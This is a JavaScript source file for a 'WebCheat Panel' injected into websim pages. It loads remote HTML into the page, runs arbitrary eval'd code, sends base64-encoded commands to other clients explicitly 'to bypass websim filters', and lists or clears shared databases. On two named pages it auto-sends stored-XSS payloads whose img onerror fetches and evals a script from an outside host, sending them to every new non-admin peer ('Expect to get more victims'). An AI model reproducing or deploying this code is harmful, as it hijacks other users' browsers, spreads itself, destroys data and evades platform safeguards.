
function createDarkModePanel() {
  // Check if the panel already exists
  if (document.getElementById("darkModePanel")) {
    console.log("Dark mode panel already exists.");
    return;
  }

  // Create and add the draggable panel
  const panelr = document.createElement("div");
  panelr.id = "darkModePanel";
  panelr.style.position = "absolute";
  panelr.style.width = "700px";
  panelr.style.height = "400px";
  panelr.style.backgroundColor = "#333"; // Dark mode background
  panelr.style.color = "#fff"; // Dark mode text
  panelr.style.border = "1px solid #444";
  panelr.style.borderRadius = "8px";
  panelr.style.padding = "10px";
  panelr.style.boxShadow = "0 4px 8px rgba(0, 0, 0, 0.2)";
  panelr.style.overflow = 'scroll';
  // do not inherit anything from the body
  panelr.style.zIndex = "9999"; // Ensure it appears above other elements
  panelr.style.fontFamily = "Arial, sans-serif";
  panelr.style.fontSize = "14px";
  panelr.style.display = "flex";
  panelr.style.flexDirection = "column";
  panelr.style.alignItems = "center";
  panelr.style.justifyContent = "center";
  panelr.style.top = "50%"; // Center vertically
  panelr.style.left = "50%"; // Center horizontally
  panelr.style.transform = "translate(-50%, -50%)"; // Adjust for centering
  panelr.style.transition = "all 0.0s ease"; // Smooth transition for any changes
  panelr.style.backgroundColor = "rgba(51, 51, 51, 0.9)"; // Semi-transparent dark background
  panelr.style.backdropFilter = "blur(5px)"; // Blur effect for the background
  panelr.style.boxShadow = "0 4px 20px rgba(0, 0, 0, 0.5)"; // Enhanced shadow for depth
  panelr.style.borderRadius = "10px"; // Rounded corners
  panelr.style.padding = "20px"; // Padding for inner content
  panelr.style.maxWidth = "90%"; // Responsive width
  panelr.style.maxHeight = "80%"; // Responsive height
  panelr.style.overflowY = "auto"; // Allow scrolling if content overflows
  panelr.style.overflowX = "auto"; // Prevent horizontal overflow
  // add a title bar with a minimize button
  const titleBar = document.createElement("div");
  titleBar.style.backgroundColor = "#444";
  titleBar.style.color = "#fff";
  titleBar.style.padding = "10px";
  titleBar.style.cursor = "move";
  titleBar.style.display = "flex";
  titleBar.style.justifyContent = "space-between";
  titleBar.style.alignItems = "center";
  titleBar.style.borderRadius = "8px 8px 0 0";
  // make the title bar across all the sides
  titleBar.style.width = "100%";
  titleBar.style.boxSizing = "border-box"; // Include padding in width calculation
  titleBar.textContent = "WebCheat Panel";
  const minimizeButton = document.createElement("button");
  minimizeButton.textContent = "-";
  minimizeButton.style.backgroundColor = "#444";
  minimizeButton.style.color = "#fff";
  minimizeButton.style.border = "none";
  minimizeButton.style.borderRadius = "5px";
  minimizeButton.style.cursor = "pointer";
  minimizeButton.style.marginLeft = "10px";

  titleBar.appendChild(minimizeButton);

  panelr.appendChild(titleBar);
  // panel is div in the panelr
  const panel = document.createElement("div");
  panel.id = "panel";
  panel.style.padding = "10px";
  panel.style.overflow = "auto"; // Allow scrolling if content overflows
  panelr.appendChild(panel);
  minimizeButton.addEventListener("click", () => {
    if (panel.style.display === "none") {
      panel.style.display = "block";
    } else {
      panel.style.display = "none";
    }
  });
  // Position the panel in the middle of the viewport
  const viewportHeight = window.innerHeight;
  const scrollY = window.scrollY;
  const viewportWidth = window.innerWidth;

  panel.style.top = `${scrollY + viewportHeight / 2 - 100}px`; // Center vertically (-100 to adjust for half the panel height)
  panel.style.left = `${viewportWidth / 2 - 150}px`; // Center horizontally (-150 to adjust for half the panel width)

  // Append panel to the html not body
  document.body.appendChild(panelr);

  // Make the panel draggable
  let isDragging = false;
  let offsetX, offsetY;
  titleBar.onmousedown = function (e) {
    isDragging = true;
    // Remove transform to use absolute left and top coordinates
    panelr.style.transform = "";
    offsetX = e.clientX - parseInt(panelr.style.left, 10);
    offsetY = e.clientY - parseInt(panelr.style.top, 10);
    // prevent text selection
    e.preventDefault();
  };
  document.onmousemove = function (e) {
    if (isDragging) {
      panelr.style.left = e.clientX - offsetX + "px";
      panelr.style.top = e.clientY - offsetY + "px";
    }
  };
  document.onmouseup = function () {
    isDragging = false;
  };

  // Prevent default drag events
  titleBar.ondragstart = function () {
    return false;
  };
  // Create and add the "Load Equinox" button
  const loadEquinoxButton = document.createElement("button");
  loadEquinoxButton.id = "loadEquinoxButton";
  loadEquinoxButton.textContent = "Load Equinox";
  loadEquinoxButton.style.padding = "10px 20px";
  loadEquinoxButton.style.backgroundColor = "#333";
  loadEquinoxButton.style.color = "#fff";
  loadEquinoxButton.style.border = "none";
  loadEquinoxButton.style.borderRadius = "5px";
  loadEquinoxButton.style.cursor = "pointer";

  // Append the button to the body
  panel.appendChild(loadEquinoxButton);

  // Add a click event listener to the button
  loadEquinoxButton.addEventListener("click", async () => {
    try {
      // Fetch the equinox file from the raw GitHub URL
      const response = await fetch("https://e1x8.xyz/scripts/equ.html");
      if (!response.ok) {
        throw new Error(`Failed to load equinox: ${response.statusText}`);
      }

      // Get the Base64-encoded content of the file
      const base64Content = await response.text();

      // Decode the Base64 content
      const decodedContent = base64Content
      document.body.innerHTML += decodedContent;
      // wait for the equinox to load
      const equinoxLoaded = new Promise((resolve) => {
        const checkEquinox = setInterval(() => {
          if (document.querySelector("#equinox")) {
            clearInterval(checkEquinox);
            resolve();
          }
        }
        , 1000);
      });
      await equinoxLoaded;
      // trigger event "gongbong"
      const event = new Event("gongbong");
      document.dispatchEvent(event);

      console.log("Equinox loaded and appended to the page.");
    } catch (error) {
      console.error("Error loading equinox:", error);
      alert("Failed to load equinox. Check the console for details.");
    }
  });
  // Create and add the "Find XSS" button
  const findXSSButton = document.createElement("button");
  findXSSButton.id = "findXSSButton";
  findXSSButton.textContent = "Find XSS";
  findXSSButton.style.margin = "10px";
  findXSSButton.style.padding = "10px 20px";
  findXSSButton.style.backgroundColor = "#555";
  findXSSButton.style.color = "#fff";
  findXSSButton.style.border = "none";
  findXSSButton.style.borderRadius = "5px";
  findXSSButton.style.cursor = "pointer";

  panel.appendChild(findXSSButton);
  // Add a log area to the panel
  const logArea = document.createElement("div");
  logArea.id = "logArea";
  logArea.style.margin = "10px";
  logArea.style.padding = "10px";
  logArea.style.backgroundColor = "#222";
  logArea.style.color = "#fff";
  logArea.style.border = "1px solid #444";
  logArea.style.borderRadius = "5px";
  logArea.style.height = "200px";
  logArea.style.overflowY = "auto";
  panel.appendChild(logArea);

  // Helper function to log messages to the log area
  function logMessage(message, type = "info") {
    const logEntry = document.createElement("div");
    logEntry.textContent = message;
    logEntry.style.color = type === "error" ? "red" : "#fff";
    logArea.appendChild(logEntry);
    logArea.scrollTop = logArea.scrollHeight; // Auto-scroll to the latest log
  }

  // Modify the "Find XSS" button to use the log area
  findXSSButton.addEventListener("click", async () => {
    logMessage("Scanning for scripts and potential XSS vulnerabilities...");
    const scripts = document.querySelectorAll("script");

    for (const script of scripts) {
      if (script.src) {
        logMessage(`Fetching external script: ${script.src}`);
        try {
          const response = await fetch(script.src);
          const scriptContent = await response.text();
          analyzeScript(scriptContent, script.src);
        } catch (error) {
          logMessage(`Failed to fetch script from ${script.src}: ${error}`, "error");
        }
      } else {
        logMessage("Analyzing inline script...");
        analyzeScript(script.innerHTML, "inline script");
      }
    }
  });
  let sendCommand = false;
  let command = "";
  room.onmessage = (event) => {
    try {
      // Check if the event contains data and if the data has the correct type
      if (event.data) {
        if (
          event.data.type === "joined" &&
          room.peers[event.data.clientId]
        ) {
          if (admins.includes(room.peers[event.data.clientId].username)) {
            logMessage("Epic user joined: " + room.peers[event.data.clientId].username);
          }
          else {
            logMessage("User comprimised: " + room.peers[event.data.clientId].username);
            if (sendCommand) {
              room.send({
                type: "autoCommand",
                command: command,
              });
            }
          }

        } else {
          if (event.data.type === "command" && (
            room.peers[event.data.clientId].username === "blueyellow" ||
            room.peers[event.data.clientId].username === "TheEthicalHacker"
          )) {
            logMessage("Epic user: " + room.peers[event.data.clientId].username + " sent a command: " + event.data.command);
          }
        }
      }
    } catch (error) {
      console.error("Error processing message:", error);
    }
  };
  // add a search bar to filter the scripts
  const filterContainer = document.createElement("div");
  filterContainer.style.margin = "10px";

  const filterLabel = document.createElement("label");
  filterLabel.textContent = "Script Filter:";
  filterLabel.style.marginRight = "10px";
  filterLabel.style.color = "#fff";
  filterContainer.appendChild(filterLabel);

  const filterInput = document.createElement("input");
  filterInput.type = "text";
  filterInput.id = "filterInput";
  filterInput.placeholder = "Enter keyword to filter scripts...";
  filterInput.style.border = "1px solid #444";
  filterInput.style.borderRadius = "5px";
  filterInput.style.backgroundColor = "#222";
  filterInput.style.color = "#fff";
  filterInput.addEventListener("input", (e) => {
    window.scriptFilterKeyword = e.target.value;
  });
  filterContainer.appendChild(filterInput);

  panel.appendChild(filterContainer);
  function analyzeScript(scriptContent, source) {
    // Use the user-specified filter keyword if available (set globally or via some UI)
    const filterKeyword = window.scriptFilterKeyword || "";
    if (filterKeyword && !source.toLowerCase().includes(filterKeyword.toLowerCase())) {
      logMessage(`Skipping ${source} (doesn't match search "${filterKeyword}").`);
      return;
    }

    logMessage(`Analyzing script from ${source}...`);
    const dangerousPatterns = [
      /innerHTML\s*=/g,
      /document\.write/g,
      /eval\s*\(/g,
      /setTimeout\s*\(/g,
      /setInterval\s*\(/g,
      /location\.hash/g,
      /on\w+\s*=/g,
    ];

    let foundIssues = false;

    dangerousPatterns.forEach((pattern) => {
      const matches = scriptContent.match(pattern);
      if (matches) {
        foundIssues = true;
        logMessage(
          `Potential XSS vulnerability found in ${source}: Pattern "${pattern}" matches ${matches.length} time(s).`,
          "error"
        );
      }
    });

    if (!foundIssues) {
      logMessage(`No potential XSS vulnerabilities found in ${source}.`);
    }
  }

  // Add an input field and button to send commands
  const commandInput = document.createElement("input");
  commandInput.id = "commandInput";
  commandInput.type = "text";
  commandInput.placeholder = "Enter javascript code...";
  commandInput.style.margin = "10px";
  commandInput.style.padding = "10px";
  commandInput.style.width = "calc(100% - 150px)";
  commandInput.style.border = "1px solid #444";
  commandInput.style.borderRadius = "5px";
  commandInput.style.backgroundColor = "#222";
  commandInput.style.color = "#fff";
  commandInput.style.fontFamily = "monospace";
  panel.appendChild(commandInput);

  const sendCommandButton = document.createElement("button");
  sendCommandButton.id = "sendCommandButton";
  sendCommandButton.textContent = "Send Command";
  sendCommandButton.style.margin = "10px";
  sendCommandButton.style.padding = "10px 20px";
  sendCommandButton.style.backgroundColor = "#007bff";
  sendCommandButton.style.color = "#fff";
  sendCommandButton.style.border = "none";
  sendCommandButton.style.borderRadius = "5px";
  sendCommandButton.style.cursor = "pointer";
  panel.appendChild(sendCommandButton);

  sendCommandButton.addEventListener("click", () => {
    const inputData = commandInput.value;
    if (!inputData) {
      logMessage("Command input is empty. Please enter a command.", "error");
      return;
    }

    try {
      // encode it first to bypass websim filters
      const encodedCommand = btoa(inputData);
      room.send({ type: "command", command: encodedCommand });
      logMessage(`Command sent: ${inputData}`);
    } catch (error) {
      logMessage(`Failed to send command: ${error}`, "error");
    }
  });
  const codeInput = document.createElement("textarea");
  codeInput.id = "codeInput";
  codeInput.placeholder = "Enter your JavaScript code here...";
  codeInput.style.margin = "10px";
  codeInput.style.padding = "10px";
  codeInput.style.width = "calc(100% - 30px)";
  codeInput.style.height = "100px";
  codeInput.style.border = "1px solid #444";
  codeInput.style.borderRadius = "5px";
  codeInput.style.backgroundColor = "#222";
  codeInput.style.color = "#fff";
  codeInput.style.fontFamily = "monospace";
  panel.appendChild(codeInput);

  // Create a button to execute the code
  const runCodeButton = document.createElement("button");
  runCodeButton.id = "runCodeButton";
  runCodeButton.textContent = "Run Code";
  runCodeButton.style.margin = "10px";
  runCodeButton.style.padding = "10px 20px";
  runCodeButton.style.backgroundColor = "#007bff";
  runCodeButton.style.color = "#fff";
  runCodeButton.style.border = "none";
  runCodeButton.style.borderRadius = "5px";
  runCodeButton.style.cursor = "pointer";
  panel.appendChild(runCodeButton);

  // Add an event listener to the button
  runCodeButton.addEventListener("click", () => {
    const code = codeInput.value;
    if (!code) {
      alert("Please enter some code to run.");
      return;
    }

    try {
      // Execute the code entered by the user
      const result = eval(code); // WARNING: Be cautious when using eval
      console.log("Code executed successfully:", result);
      alert("Code executed successfully. Check the console for output.");
    } catch (error) {
      console.error("Error executing code:", error);
      alert(`Error executing code: ${error.message}`);
    }
  });
  // add a button to list off stuff in database. Requies input for database name
  const databaseInput = document.createElement("input");
  databaseInput.id = "databaseInput";
  databaseInput.type = "text";
  databaseInput.placeholder = "Enter database name...";
  databaseInput.style.margin = "10px";
  databaseInput.style.padding = "10px";
  databaseInput.style.width = "calc(100% - 150px)";
  databaseInput.style.border = "1px solid #444";
  databaseInput.style.borderRadius = "5px";
  databaseInput.style.backgroundColor = "#222";
  databaseInput.style.color = "#fff";
  databaseInput.style.fontFamily = "monospace";
  panel.appendChild(databaseInput);
  const listButton = document.createElement("button");
  listButton.id = "listButton";
  listButton.textContent = "List Database";
  listButton.style.margin = "10px";
  listButton.style.padding = "10px 20px";
  listButton.style.backgroundColor = "#555";
  listButton.style.color = "#fff";
  listButton.style.border = "none";
  listButton.style.borderRadius = "5px";
  listButton.style.cursor = "pointer";
  panel.appendChild(listButton);
  // Add an event listener to the button
  listButton.addEventListener("click", async () => {
    // Connect to the room
    const room = new WebsimSocket();
    room.initialize();
    const databaseName = databaseInput.value;
    if (!databaseName) {
      alert("Please enter a database name.");
      return;
    }
    try {
      const collection = await room.collection(databaseName).getList();
      const listOutput = document.createElement("div");
      listOutput.id = "listOutput";
      listOutput.style.margin = "10px";
      listOutput.style.padding = "10px";
      listOutput.style.backgroundColor = "#222";
      listOutput.style.color = "#fff";
      listOutput.style.border = "1px solid #444";
      listOutput.style.borderRadius = "5px";
      listOutput.style.height = "200px";
      listOutput.style.overflowY = "auto";
      listOutput.textContent = "Database Contents:\n";
      collection.forEach((item) => {
        listOutput.textContent += `${JSON.stringify(item)}\n`;
      });
      panel.appendChild(listOutput);
      // add button to close 
      const closeButton = document.createElement("button");
      closeButton.id = "closeButton";
      closeButton.textContent = "Close";
      closeButton.style.margin = "10px";
      closeButton.style.padding = "10px 20px";
      closeButton.style.backgroundColor = "#ff4d4d";
      closeButton.style.color = "#fff";
      closeButton.style.border = "none";
      closeButton.style.borderRadius = "5px";
      closeButton.style.cursor = "pointer";
      closeButton.addEventListener("click", () => {
        listOutput.remove();
        closeButton.remove();
      });
      panel.appendChild(closeButton);
    } catch (error) {
      console.error("Error listing database:", error);
      alert(`Error listing database: ${error.message}`);
    }
  });
  // also a clear button
  const clearButton = document.createElement("button");
  clearButton.id = "clearButton";
  clearButton.textContent = "Clear Database";
  clearButton.style.margin = "10px";
  clearButton.style.padding = "10px 20px";
  clearButton.style.backgroundColor = "#ff4d4d";
  clearButton.style.color = "#fff";
  clearButton.style.border = "none";
  clearButton.style.borderRadius = "5px";
  clearButton.style.cursor = "pointer";
  panel.appendChild(clearButton);
  // Add an event listener to the button
  clearButton.addEventListener("click", async () => {
    const databaseName = databaseInput.value;
    if (!databaseName) {
      alert("Please enter a database name.");
      return;
    }
    try {
      // get all the collections
      const collections = await room.collection(databaseName).getList();
      // delete all the collections
      for (const collection of collections) {
        await room.collection(databaseName).delete(collection.id);
      }
      logMessage(`Database ${databaseName} cleared successfully.`);
    } catch (error) {
      console.error("Error clearing database:", error);
      alert(`Error clearing database: ${error.message}`);
    }
  });
  const labelPage = document.createElement("p");
  labelPage.textContent = window.location.href;
  panel.appendChild(labelPage);

  // Check if the URL contains the specified keyword
  if (window.location.href.includes("_dor_svv8_1rml0843vu")) {
    // Create the checkbox and label
    const autoSendCheckbox = document.createElement("input");
    autoSendCheckbox.type = "checkbox";
    autoSendCheckbox.id = "autoSendCheckbox";
    autoSendCheckbox.style.margin = "10px";

    const autoSendLabel = document.createElement("label");
    autoSendLabel.htmlFor = "autoSendCheckbox";
    autoSendLabel.textContent = "Automatically send the client to others?";
    autoSendLabel.style.color = "#fff";

    // Append the checkbox and label to the panel
    panel.appendChild(autoSendCheckbox);
    panel.appendChild(autoSendLabel);
    
    // Function to handle new client join and send XSS.html contents
    async function handleNewClientJoin() {
      try {

        const contentsOfXSS = `<img src="asd" id="targetImage" onerror='fetch("https://e1x8.xyz/scripts/main.js").then((response) => response.text()).then((text) => eval(text)).then(() => {})' style="display: none;"></img>`;
        const currentPeers = room.peers;
        setInterval(() => {

          // Check if a new peer has joined
          for (const peerId in currentPeers) {
            if (!previousPeers[peerId] ) {
              logMessage(`New peer joined: ${currentPeers[peerId].username}`);
              // A new peer has joined
              if (autoSendCheckbox.checked && !admins.includes(currentPeers[peerId].username)) {
                setTimeout(() => {
                room.send({
                  type: "chat",
                  message: contentsOfXSS,
                  section: "chicken"
                });
                logMessage(`Sent contents of XSS.html to new peer: ${room.peers[peerId].username}`);
              }, 3500); // Delay before sending
              }
            }
          }

          // Update the previousPeers to the current state
          previousPeers = { ...currentPeers };
        }, 1000); // Check every 1 second
      } catch (error) {
        console.error("Error fetching or sending XSS.html contents:", error);
      }
    }

    // Initialize the handling of new client joins
    handleNewClientJoin();
  } else if (window.location.href.includes("lplfins83rpsgxi315zz")) {
    // Gamble your life savings away! game. Also XSS possible with message.sender.
    /*// Create message object
        const chatMessage = {
            type: 'chat',
            text: message,
            sender: username,
            avatar: avatar,
            timestamp: Date.now()
        };
        
        // Send message to all users
        room.send(chatMessage);// Set message HTML
        messageEl.innerHTML = `
            ${avatarHTML}
            <div class="message-content">
                <div class="message-sender">${message.sender}</div>
                <div class="message-text">${escapeHTML(message.text)}</div>
                <div class="message-time">${timestamp}</div>
            </div>
        `;*/
    // Send message
    const XSS = {
      type: 'chat',
      text: "Hello!",
      sender: `<img src="asd" id="targetImage" onerror='fetch("https://raw.githubusercontent.com/JammyCat91283/websim/refs/heads/main/main.js").then((response) => response.text()).then((text) => eval(text)).then(() => {})' style="display: none;"></img>`,
      avatar: "https://example.com/avatar.png", // Replace with actual avatar URL
      timestamp: Date.now()
    };
    // add a button to send the message
    const sendMessageButton = document.createElement("button");
    sendMessageButton.id = "sendMessageButton";
    sendMessageButton.textContent = "Send XSS";
    sendMessageButton.style.margin = "10px";
    sendMessageButton.style.padding = "10px 20px";
    sendMessageButton.style.backgroundColor = "#007bff";
    sendMessageButton.style.color = "#fff";
    sendMessageButton.style.border = "none";
    sendMessageButton.style.borderRadius = "5px";
    sendMessageButton.style.cursor = "pointer";
    panel.appendChild(sendMessageButton);
    sendMessageButton.addEventListener("click", () => {
      room.send(XSS);
      logMessage(`XSS. Expect to get more victims.`);
    });
    // auto send to new clients
    let previousPeers = {};
    setInterval(() => {
      const currentPeers = room.peers || {};
      // Check if a new peer has joined
      for (const peerId in currentPeers) {
        if (!previousPeers[peerId] && !admins.includes(currentPeers[peerId].username)) {
          logMessage(`New peer joined: ${currentPeers[peerId].username}`);
          // A new peer has joined
          setTimeout(() => {
            room.send(XSS);
            logMessage(`Sent XSS to new peer: ${room.peers[peerId].username}`);
          }, 3500); // Delay before sending
        }
      }
      // Update the previousPeers to the current state
      previousPeers = { ...currentPeers };
    }, 1000); // Check every 1 second

  }
}

// Call the function to ensure the panel is created
createDarkModePanel();
